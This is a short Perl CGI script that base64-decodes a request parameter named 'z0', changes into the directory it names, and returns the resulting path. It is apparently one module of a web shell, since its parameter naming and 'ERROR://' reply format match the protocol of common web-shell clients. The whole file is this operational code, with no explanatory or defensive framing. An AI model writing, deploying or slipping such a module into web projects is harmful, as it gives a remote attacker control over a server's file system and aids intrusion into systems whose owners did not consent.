use strict;
use warnings;
use CGI;
use MIME::Base64;
use Cwd qw(getcwd);

sub main {
    my $q = CGI->new;
    my $z0 = $q->param('z0') // '';

    my $sz_dir_path = decode_base64($z0);

    if (chdir($sz_dir_path)) {
        print "1|" . getcwd();
    } else {
        die "ERROR://Cannot open directory.";
    }
}

main();